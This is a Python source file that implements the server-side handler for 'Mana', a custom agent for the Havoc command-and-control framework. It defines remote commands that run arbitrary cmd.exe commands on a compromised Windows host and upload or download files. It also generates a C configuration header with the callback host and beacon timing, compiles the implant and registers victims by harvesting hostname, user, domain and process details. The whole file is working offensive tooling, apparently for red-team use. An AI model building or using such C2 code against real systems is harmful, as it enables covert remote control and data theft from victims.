from base64 import b64decode
from havoc.service import HavocService
from havoc.agent import *

import ast
import os
import re
import random

COMMAND_REGISTER         = 0x100
COMMAND_GET_JOB          = 0x101
COMMAND_NO_JOB           = 0x102

COMMAND_SHELL            = 0x152
COMMAND_UPLOAD           = 0x153
COMMAND_DOWNLOAD         = 0x154
COMMAND_EXIT             = 0x155

COMMAND_OUTPUT           = 0x200


# ====================
# ===== Commands =====
# ====================

class CommandShell(Command):
    CommandId = COMMAND_SHELL
    Name = "shell"
    Description = "executes commands using cmd.exe"
    Help = ""
    NeedAdmin = False
    Params = [
        CommandParam(
            name="commands",
            is_file_path=False,
            is_optional=False
        )
    ]
    Mitr = []

    def job_generate( self, arguments: dict ) -> bytes:
        Task = Packer()
        Task.add_int( self.CommandId )
        Task.add_data( "c:\\windows\\system32\\cmd.exe /c " + arguments[ 'commands' ] )
        return Task.buffer


class CommandUpload( Command ):
    CommandId   = COMMAND_UPLOAD
    Name        = "upload"
    Description = "uploads a file to the host"
    Help        = ""
    NeedAdmin   = False
    Mitr        = []
    Params      = [
        CommandParam(
            name="local_file",
            is_file_path=True,
            is_optional=False
        ),
        CommandParam(
            name="remote_file",
            is_file_path=False,
            is_optional=False
        )
    ]

    def job_generate( self, arguments: dict ) -> bytes:
        Task        = Packer()
        remote_file = arguments[ 'remote_file' ]
        fileData    = b64decode( arguments[ 'local_file' ] )
        Task.add_int( self.CommandId )
        Task.add_data( remote_file )
        Task.add_data( fileData )
        return Task.buffer


class CommandDownload( Command ):
    CommandId   = COMMAND_DOWNLOAD
    Name        = "download"
    Description = "downloads the requested file"
    Help        = ""
    NeedAdmin   = False
    Mitr        = []
    Params      = [
        CommandParam(
            name="remote_file",
            is_file_path=False,
            is_optional=False
        ),
    ]

    def job_generate( self, arguments: dict ) -> bytes:
        Task        = Packer()
        remote_file = arguments[ 'remote_file' ]
        Task.add_int( self.CommandId )
        Task.add_data( remote_file )
        return Task.buffer


class CommandExit( Command ):
    CommandId   = COMMAND_EXIT
    Name        = "exit"
    Description = "tells the Mana agent to exit"
    Help        = ""
    NeedAdmin   = False
    Mitr        = []
    Params      = []

    def job_generate( self, arguments: dict ) -> bytes:
        Task = Packer()
        Task.add_int( self.CommandId )
        return Task.buffer


# ==============================
# ===== Configuration ==========
# ==============================

PROFILE_PATH = "<full path to your profile>"
CONFIG_OUTPUT = "./Include/Config.h"


# ==============================
# ===== Profile Parser =========
# ==============================

def HavocProfileParser(profile: str = PROFILE_PATH, listener_name: str = None) -> dict:
    """
    Parse Havoc profile and return listener config.
    """
    FIELDS = {
        "Name": str,
        "Hosts": list,
        "PortBind": int,
        "Secure": bool,
        "UserAgent": str,
        "Uris": list,
        "Headers": list,
    }
    
    listeners = []
    current = {}
    in_http = False
    brace_depth = 0
    in_nested = False
    
    with open(profile, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            
            if not line or line.startswith('#'):
                continue
            
            if re.match(r'^Http\s*\{', line):
                in_http = True
                brace_depth = 1
                in_nested = False
                current = {}
                continue
            
            if in_http:
                open_braces = line.count('{')
                close_braces = line.count('}')
                
                if open_braces > 0:
                    in_nested = True
                    brace_depth += open_braces
                    continue
                
                if close_braces > 0:
                    brace_depth -= close_braces
                    if brace_depth == 1:
                        in_nested = False
                    if brace_depth <= 0:
                        if current:
                            listeners.append(current.copy())
                        in_http = False
                        in_nested = False
                        current = {}
                    continue
                
                if in_nested:
                    continue
                
                if "=" in line:
                    key, value = map(str.strip, line.split("=", 1))
                    
                    if key not in FIELDS:
                        continue
                    
                    if value.lower() == "false":
                        value = "False"
                    elif value.lower() == "true":
                        value = "True"
                    
                    try:
                        current[key] = ast.literal_eval(value)
                    except (ValueError, SyntaxError):
                        current[key] = value
    
    if listener_name:
        for listener in listeners:
            if listener.get('Name') == listener_name:
                return listener
        return {}
    
    return listeners[0] if listeners else {}


# ==============================
# ===== Config.h Generator =====
# ==============================

def generate_config_header(listener: dict, sleep: int, jitter: int, magic: int) -> str:
    """
    Generate config.h from listener configuration.
    """
    
    def c_escape(s):
        if s is None:
            return ""
        return str(s).replace('\\', '\\\\').replace('"', '\\"')
    
    # Extract values
    hosts = listener.get('Hosts', ['127.0.0.1'])
    port = listener.get('PortBind', 80)
    secure = listener.get('Secure', False)
    user_agent = listener.get('UserAgent', 'Mozilla/5.0')
    uris = listener.get('Uris', ['/'])
    headers = listener.get('Headers', [])
    
    host = hosts[0] if hosts else '127.0.0.1'
    endpoint = random.choice(uris) if uris else '/'
    
    # Build headers section
    # headers_section = ""
    # for i, h in enumerate(headers):
    #     headers_section += f'#define CONFIG_HEADER_{i} L"{c_escape(h)}\\r\\n"\n'
    # headers_section += f'#define CONFIG_HEADER_COUNT {len(headers)}'

    # Build individual header defines
    header_defines = ""
    for i, h in enumerate(headers):
        header_defines += '#define CONFIG_HEADER_' + str(i) + ' L"' + c_escape(h) + '\\r\\n"\n'
    
    # Build headers array items (referencing the defines)
    header_array_items = ""
    for i in range(len(headers)):
        header_array_items += '    CONFIG_HEADER_' + str(i) + ',\n'
    
    config_h = f'''#include <windows.h>
// =============================================================================
// NETWORK CONFIGURATION (from Havoc Listener)
// =============================================================================
#define CONFIG_HOST         L"{c_escape(host)}"
#define CONFIG_PORT         {port}
#define CONFIG_SECURE       {'TRUE' if secure else 'FALSE'}
#define CONFIG_ENDPOINT     L"{c_escape(endpoint)}"
#define CONFIG_USER_AGENT    L"{c_escape(user_agent)}"

// =============================================================================
// TIMING CONFIGURATION (from Havoc Agent Settings)
// =============================================================================
#define CONFIG_SLEEP        {sleep * 1000}   // milliseconds
#define CONFIG_JITTER       {jitter}     // percentage (0-100)

// =============================================================================
// HTTP HEADERS (from Havoc Listener Profile)
// =============================================================================
{header_defines}#define CONFIG_HEADER_COUNT {len(headers)}

// Headers array for iteration
static LPCWSTR CONFIG_HEADERS[] = {{
{header_array_items}}};

// =============================================================================
// AGENT IDENTIFICATION
// =============================================================================
#define CONFIG_MAGIC        0x{magic:08X}
'''
    
    return config_h


# ==============================
# ===== Agent Type =============
# ==============================

class Mana(AgentType):

    Name        = "Mana"
    Author      = "damaidec"
    Version     = "0.1"
    Description = f"""3rd party agent for Havoc"""
    MagicValue  = 0x6d616e61  # 'mana'

    Arch = [
        "x64",
        "x86",
    ]

    Formats = [
        {
            "Name": "Windows Executable",
            "Extension": "exe",
        },
        {
            "Name": "Windows DLL",
            "Extension": "dll",
        },
    ]

    BuildingConfig = {
        "Sleep": "10",
        "Jitter": "20",
    }

    Commands = [
        CommandShell(),
        CommandUpload(),
        CommandDownload(),
        CommandExit(),
    ]

    # generate. this function is getting executed when the Havoc client requests for a binary/executable/payload. you can generate your payloads in this function.
    def generate(self, config: dict) -> None:
        """
        Generate payload - called from Havoc UI
        """
        print(f"config: {config}")
        
        # Get listener name from UI
        listener_name = config['Options']['Listener']['Name']
        
        # Get sleep/jitter from build config
        sleep = int(config['Config'].get('Sleep', '10'))
        jitter = int(config['Config'].get('Jitter', '20'))
        
        self.builder_send_message(config['ClientID'], "Info", f"[*] Listener: {listener_name}")
        self.builder_send_message(config['ClientID'], "Info", f"[*] Sleep: {sleep}s, Jitter: {jitter}%")
        
        # Parse profile to get listener config
        listener = HavocProfileParser(PROFILE_PATH, listener_name)
        
        if not listener:
            self.builder_send_message(config['ClientID'], "Error", f"[!] Listener '{listener_name}' not found!")
            return
        
        self.builder_send_message(config['ClientID'], "Good", f"[+] Found listener: {listener.get('Name')}")
        self.builder_send_message(config['ClientID'], "Info", f"    Host: {listener.get('Hosts', ['?'])[0]}:{listener.get('PortBind', '?')}")
        
        # Generate config.h
        config_h = generate_config_header(
            listener=listener,
            sleep=sleep,
            jitter=jitter,
            magic=self.MagicValue
        )
        
        # Write config.h
        with open(CONFIG_OUTPUT, 'w') as f:
            f.write(config_h)
        
        self.builder_send_message(config['ClientID'], "Good", f"[+] Generated: {CONFIG_OUTPUT}")
        
        # Build with cmake
        self.builder_send_message(config['ClientID'], "Info", "[*] Compiling...")
        os.system("cmake . && make")

        # Read compiled binary
        data = open("./Bin/Mana.exe", "rb").read()
        
        self.builder_send_message(config['ClientID'], "Good", f"[+] Size: {len(data)} bytes")

        # build_send_payload. this function send back your generated payload
        self.builder_send_payload(config['ClientID'], self.Name + ".exe", data)
    
    # this function handles incomming requests based on our magic value. you can respond to the agent by returning your data from this function.
    def response(self, response: dict) -> bytes:
        """
        Handle incoming agent requests
        """
        agent_header    = response["AgentHeader"]
        agent_response  = b64decode(response["Response"])
        response_parser = Parser(agent_response, len(agent_response))
        Command         = response_parser.parse_int()

        print(f"agent header: {agent_header}")
        print(f"agent response: {agent_response}")
        print(f"Response parser: {response_parser}")
        print(f"Command issued: {hex(Command)}")

        print(f"Agent: {response["Agent"]}")

        hex_command = hex(Command)
        if response["Agent"] is None:
            # so when the Agent field is empty this either means that the agent doesn't exists.
            print("youre hitting agent is none")

            if Command == COMMAND_REGISTER:
                print("[*] Is agent register request")

                # Register info:
                #   - AgentID           : int [needed]
                #   - Hostname          : str [needed]
                #   - Username          : str [needed]
                #   - Domain            : str [optional]
                #   - InternalIP        : str [needed]
                #   - Process Path      : str [needed]
                #   - Process Name      : str [needed]
                #   - Process ID        : int [needed]
                #   - Process Parent ID : int [optional]
                #   - Process Arch      : str [needed]
                #   - Process Elevated  : int [needed]
                #   - OS Build          : str [needed]
                #   - OS Version        : str [needed]
                #   - OS Arch           : str [optional]
                #   - Sleep             : int [optional]

                RegisterInfo = {
                    "AgentID":          response_parser.parse_int(),
                    "Hostname":         response_parser.parse_str(),
                    "Username":         response_parser.parse_str(),
                    "Domain":           response_parser.parse_str(),
                    "InternalIP":       response_parser.parse_str(),
                    "Process Path":     response_parser.parse_str(),
                    "Process ID":       str(response_parser.parse_int()),
                    "Process Parent ID": str(response_parser.parse_int()),
                    "Process Arch":     response_parser.parse_int(),
                    "Process Elevated": response_parser.parse_int(),
                    "OS Build":         str(response_parser.parse_int()) + "." + str(response_parser.parse_int()) + "." + str(response_parser.parse_int()) + "." + str(response_parser.parse_int()) + "." + str(response_parser.parse_int()),
                    "OS Arch":          response_parser.parse_int(),
                    "SleepDelay":       response_parser.parse_int(),
                }
                # this OS info is going to be displayed on the GUI Session table.

                RegisterInfo["Process Name"] = RegisterInfo["Process Path"].split("\\")[-1]
                RegisterInfo["OS Version"] = RegisterInfo["OS Build"]

                if RegisterInfo[ "OS Arch" ] == 0:
                    RegisterInfo[ "OS Arch" ] = "x86"
                elif RegisterInfo[ "OS Arch" ] == 9:
                    RegisterInfo[ "OS Arch" ] = "x64/AMD64"
                elif RegisterInfo[ "OS Arch" ] == 5:
                    RegisterInfo[ "OS Arch" ] = "ARM"
                elif RegisterInfo[ "OS Arch" ] == 12:
                    RegisterInfo[ "OS Arch" ] = "ARM64"
                elif RegisterInfo[ "OS Arch" ] == 6:
                    RegisterInfo[ "OS Arch" ] = "Itanium-based"
                else:
                    RegisterInfo[ "OS Arch" ] = "Unknown (" + RegisterInfo[ "OS Arch" ] + ")"

                # Process Arch
                if RegisterInfo[ "Process Arch" ] == 0:
                    RegisterInfo[ "Process Arch" ] = "Unknown"

                elif RegisterInfo[ "Process Arch" ] == 1:
                    RegisterInfo[ "Process Arch" ] = "x86"

                elif RegisterInfo[ "Process Arch" ] == 2:
                    RegisterInfo[ "Process Arch" ] = "x64"

                elif RegisterInfo[ "Process Arch" ] == 3:
                    RegisterInfo[ "Process Arch" ] = "IA64"

                self.register( agent_header, RegisterInfo )

                return RegisterInfo[ 'AgentID' ].to_bytes( 4, 'little' ) # return the agent id to the agent

            else:
                print("[-] Is not agent register request")

        else:
            print( f"[*] Something else: {Command}" )

            AgentID = response[ "Agent" ][ "NameID" ]

            if Command == COMMAND_REGISTER:
                print("[*] Agent re-registering, returning existing ID")
                return int(AgentID, 16).to_bytes(4, 'little')

            if Command == COMMAND_GET_JOB:
                print( "[*] Get list of jobs and return it." )

                Tasks = self.get_task_queue( response[ "Agent" ] )

                # if there is no job just send back a COMMAND_NO_JOB command.
                if len(Tasks) == 0:
                    Tasks = COMMAND_NO_JOB.to_bytes( 4, 'little' )

                print( f"Tasks: {Tasks.hex()}" )
                return Tasks

            elif Command == COMMAND_OUTPUT:

                Output = response_parser.parse_str()
                print( "[*] Output: \n" + Output )

                self.console_message( AgentID, "Good", "Received Output:", Output )

            elif Command == COMMAND_UPLOAD:

                FileSize = response_parser.parse_int()
                FileName = response_parser.parse_str()

                self.console_message( AgentID, "Good", f"File was uploaded: {FileName} ({FileSize} bytes)", "" )

            elif Command == COMMAND_DOWNLOAD:

                FileName    = response_parser.parse_str()
                FileContent = response_parser.parse_str()

                self.console_message( AgentID, "Good", f"File was downloaded: {FileName} ({len(FileContent)} bytes)", "" )

                self.download_file( AgentID, FileName, len(FileContent), FileContent )

            else:
                self.console_message( AgentID, "Error", "Command not found: %4x" % Command, "" )

        return b''


def main():
    Havoc_Mana = Mana()

    print("[*] Connect to Havoc service api")
    Havoc_Service = HavocService(
        endpoint="wss://127.0.0.1:40056/test",
        password="password1234"
    )

    print("[*] Register Mana to Havoc")
    Havoc_Service.register_agent(Havoc_Mana)


if __name__ == '__main__':
    main()